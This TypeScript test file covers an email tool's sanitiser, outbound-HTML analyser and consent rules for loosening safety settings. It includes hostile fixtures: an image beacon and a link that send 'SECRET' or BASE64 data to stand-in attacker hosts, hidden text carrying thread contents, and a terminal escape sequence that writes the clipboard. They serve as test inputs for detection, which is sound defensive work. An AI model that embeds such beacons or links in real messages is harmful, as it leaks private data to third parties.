import assert from 'node:assert/strict';
import { test } from 'node:test';
import { parseAddressList } from '../src/addresses.ts';
import {
  ConfigStore,
  classifyChange,
  configSchema,
  defaultInternalDomains,
  emptyConfig,
  type InboxConfig,
  parseConfig,
} from '../src/config.ts';
import { CommsError, ERROR_REGISTRY } from '../src/errors.ts';
import { analyseOutboundHtml, sanitizeHtmlToText, sanitizePlainText } from '../src/sanitize.ts';
import { PUBLIC_MAILBOX_DOMAINS } from '../src/taint.ts';
import { tempDir } from './helpers/temp.ts';

const ESC = String.fromCharCode(0x1b);
const BEL = String.fromCharCode(0x07);
const CSI = String.fromCharCode(0x9b);
const CR = String.fromCharCode(0x0d);

function inbox(id: string, overrides: Partial<InboxConfig> = {}): InboxConfig {
  return {
    id,
    provider: 'gmail',
    email: 'jo@example.com',
    identity: 'oidc',
    sub: id,
    client: 'default',
    tier: 'organize',
    contacts: true,
    grantedScopes: [],
    secretRef: `gmail:refresh:${id}`,
    internalDomains: [],
    createdAt: '2026-09-18T00:00:00.000Z',
    ...overrides,
  };
}

test('every error code maps to a documented exit status', () => {
  const exits = new Set(Object.values(ERROR_REGISTRY).map((spec) => spec.exit));
  for (const exit of exits) assert.ok([1, 10, 64, 65, 66, 69, 75, 77, 78].includes(exit), `unexpected exit ${exit}`);
  assert.equal(new CommsError('POLICY_NEVER', 'x').exitCode, 10);
  assert.equal(new CommsError('KEYCHAIN_APPROVAL_PENDING', 'x').exitCode, 75);
  assert.equal(new CommsError('SCOPE_MISSING', 'x').exitCode, 77);
  assert.equal(new CommsError('RATE_CAPPED', 'x').retryable, true);
});

test('terminal control sequences in sender text are stripped, in plain and HTML bodies alike', () => {
  const hostile = `Hello${ESC}]52;c;ZXZpbA==${BEL} there${ESC}[2J${CSI}K and${CR}overwrite`;
  const plain = sanitizePlainText(hostile);
  assert.ok(![ESC, BEL, CSI, CR].some((c) => plain.text.includes(c)));
  assert.ok(plain.report.invisibleCharsRemoved >= 5);
  const html = sanitizeHtmlToText(`<p>${hostile}</p>`);
  assert.ok(![ESC, BEL, CSI, CR].some((c) => html.text.includes(c)));
});

test('the outbound analyser finds beacons, hidden text, forms and scripts that a text preview would hide', () => {
  const report = analyseOutboundHtml(
    '<p>Received, thanks.</p>' +
      '<img src="https://evil.test/p.gif?d=SECRET">' +
      '<div style="display:none">other thread contents</div>' +
      '<a href="https://attacker.test/c?d=BASE64">details</a>' +
      '<table background="https://t.test/bg.png"><tr><td style="background:url(https://t.test/cell.png)">x</td></tr></table>' +
      '<img srcset="https://t.test/a.png 1x, https://t.test/b.png 2x">' +
      '<form action="https://t.test/f"><input name="q"></form>' +
      '<span onclick="x()">y</span><style>.k{background:url(https://t.test/css.png)}</style>',
  );
  assert.deepEqual(report.remoteResources.sort(), [
    'https://evil.test/p.gif?d=SECRET',
    'https://t.test/a.png',
    'https://t.test/b.png',
    'https://t.test/bg.png',
    'https://t.test/cell.png',
    'https://t.test/css.png',
  ]);
  assert.ok(
    report.urls.some((u) => u.url === 'https://attacker.test/c?d=BASE64'),
    'full query strings are kept',
  );
  assert.ok(report.hidden.some((h) => h.text.includes('other thread contents')));
  assert.ok(report.forms >= 2);
  assert.ok(report.scripts >= 1);
  assert.match(report.visibleText, /Received, thanks\./);
  assert.ok(!report.visibleText.includes('other thread contents'));
});

test('HTML we render ourselves passes the analyser cleanly', () => {
  const report = analyseOutboundHtml(
    '<div dir="ltr"><p>Hi Sam,</p><p>See <a href="https://docs.example.com/x">the plan</a>.</p></div>',
  );
  assert.deepEqual(report.remoteResources, []);
  assert.deepEqual(report.hidden, []);
  assert.equal(report.forms, 0);
  assert.equal(report.scripts, 0);
});

test('address lists: groups expanded, names kept, addresses canonical and de-duplicated', () => {
  assert.deepEqual(
    parseAddressList('"Doe, John" <John@Example.COM>, sam@partner.test, Team: a@b.test, JOHN@example.com;'),
    [
      { name: 'Doe, John', address: 'john@example.com' },
      { name: '', address: 'sam@partner.test' },
      { name: '', address: 'a@b.test' },
    ],
  );
  assert.deepEqual(parseAddressList(undefined), []);
  assert.deepEqual(parseAddressList('undisclosed-recipients:;'), []);
});

test('loosening a safety setting is refused without consent; tightening and consented loosening pass', async () => {
  const dir = tempDir();
  const store = new ConfigStore(dir);
  await store.update((c) => ({ ...c, inboxes: { work: inbox('ibx_AAAAAAAAAAAAAAAA', { sendPolicy: 'confirm' }) } }));

  await assert.rejects(
    store.update((c) => {
      const work = c.inboxes.work as InboxConfig;
      return { ...c, inboxes: { work: { ...work, sendPolicy: 'chat' } } };
    }),
    (e: unknown) =>
      e instanceof CommsError && e.code === 'LOOSENING_REFUSED' && /inboxes\.work\.sendPolicy/.test(e.message),
  );
  const loosenings: [string, (c: ReturnType<typeof emptyConfig>) => ReturnType<typeof emptyConfig>][] = [
    ['defaults.riskEscalation', (c) => ({ ...c, defaults: { ...c.defaults, riskEscalation: false } })],
    ['defaults.sendCaps', (c) => ({ ...c, defaults: { ...c.defaults, sendCaps: { perHour: 99, perDay: 100 } } })],
    ['defaults.attachRoots', (c) => ({ ...c, defaults: { ...c.defaults, attachRoots: ['~', '/'] } })],
    ['defaults.downloadsDir', (c) => ({ ...c, defaults: { ...c.defaults, downloadsDir: '/tmp/x' } })],
    [
      'defaults.confirm.elicitationClients',
      (c) => ({ ...c, defaults: { ...c.defaults, confirm: { elicitationClients: ['x'] } } }),
    ],
  ];
  for (const [path, change] of loosenings) {
    await assert.rejects(
      store.update(change),
      (e: unknown) => e instanceof CommsError && e.code === 'LOOSENING_REFUSED',
      path,
    );
    await store.update(change, { consent: { kind: 'loosening-consent', paths: [path] } });
  }
  // Tightening never needs consent.
  await store.update((c) => {
    const work = c.inboxes.work as InboxConfig;
    return { ...c, inboxes: { work: { ...work, sendPolicy: 'never' } } };
  });
  assert.equal((await store.load()).inboxes.work?.sendPolicy, 'never');
});

test('classifyChange: inheriting a looser default counts as loosening the inbox', () => {
  const before = emptyConfig();
  before.defaults.sendPolicy = 'confirm';
  before.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA');
  const after = structuredClone(before);
  after.defaults.sendPolicy = 'chat';
  assert.deepEqual(classifyChange(before, after).loosened, ['inboxes.work.sendPolicy', 'defaults.sendPolicy']);
});

test('classifyChange: an inbox added with a looser policy than the default needs consent too', async () => {
  const before = emptyConfig();
  before.defaults.sendPolicy = 'never';
  const after = structuredClone(before);
  after.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA', { sendPolicy: 'chat' });
  assert.deepEqual(classifyChange(before, after).loosened, ['inboxes.work.sendPolicy']);

  // Inheriting the default, or being stricter than it, is not a loosening.
  const inherits = structuredClone(before);
  inherits.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA');
  assert.deepEqual(classifyChange(before, inherits).loosened, []);

  // Connecting a mailbox under the ordinary default must not demand a typed challenge.
  const ordinary = emptyConfig();
  const added = structuredClone(ordinary);
  added.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA');
  assert.deepEqual(classifyChange(ordinary, added).loosened, []);
});

test('classifyChange: a new inbox may trust its own domain, but not somebody else’s', () => {
  const before = emptyConfig();
  const own = structuredClone(before);
  const row = inbox('ibx_AAAAAAAAAAAAAAAA');
  own.inboxes.work = { ...row, email: 'jo@company.test', internalDomains: ['company.test'] };
  assert.deepEqual(classifyChange(before, own).loosened, []);

  const other = structuredClone(before);
  other.inboxes.work = { ...row, email: 'jo@company.test', internalDomains: ['company.test', 'partner.test'] };
  assert.deepEqual(classifyChange(before, other).loosened, ['inboxes.work.internalDomains']);

  // Domains are case-insensitive: writing one in capitals is not a change of meaning, so it needs no consent.
  const shouted = structuredClone(before);
  shouted.inboxes.work = { ...row, email: 'Jo@Company.TEST', internalDomains: ['Company.TEST'] };
  assert.deepEqual(classifyChange(before, configSchema.parse(shouted)).loosened, []);
});

test('classifyChange: loosening the default policy counts even when there are no inboxes yet', async () => {
  const before = emptyConfig();
  before.defaults.sendPolicy = 'never';
  const after = structuredClone(before);
  after.defaults.sendPolicy = 'confirm';
  assert.deepEqual(classifyChange(before, after).loosened, ['defaults.sendPolicy']);
  assert.deepEqual(classifyChange(after, before).loosened, []);

  const store = new ConfigStore(tempDir());
  await store.update((c) => ({ ...c, defaults: { ...c.defaults, sendPolicy: 'confirm' } }));
  const toChat = (c: ReturnType<typeof emptyConfig>) => ({
    ...c,
    defaults: { ...c.defaults, sendPolicy: 'chat' as const },
  });
  await assert.rejects(
    store.update(toChat),
    (e: unknown) => e instanceof CommsError && e.code === 'LOOSENING_REFUSED' && /defaults\.sendPolicy/.test(e.message),
  );
  await store.update(toChat, { consent: { kind: 'loosening-consent', paths: ['defaults.sendPolicy'] } });
  assert.equal((await store.load()).defaults.sendPolicy, 'chat');
});

test('the schema reserves "all" and rejects duplicate inbox ids', () => {
  const dup = { version: 1, inboxes: { a: inbox('ibx_AAAAAAAAAAAAAAAA'), b: inbox('ibx_AAAAAAAAAAAAAAAA') } };
  assert.throws(() => parseConfig(JSON.stringify(dup)), /duplicates the id/);
  const reserved = { version: 1, inboxes: { all: inbox('ibx_AAAAAAAAAAAAAAAA') } };
  assert.throws(() => parseConfig(JSON.stringify(reserved)), /reserved/);
  assert.equal(emptyConfig().secrets, undefined, 'no secret backend until the first secret is stored');
});

test('default internal domains: the inbox domain, never a public mailbox provider', () => {
  assert.deepEqual(defaultInternalDomains('jo@example.com', PUBLIC_MAILBOX_DOMAINS), ['example.com']);
  assert.deepEqual(defaultInternalDomains('jo@gmail.com', PUBLIC_MAILBOX_DOMAINS), []);
});
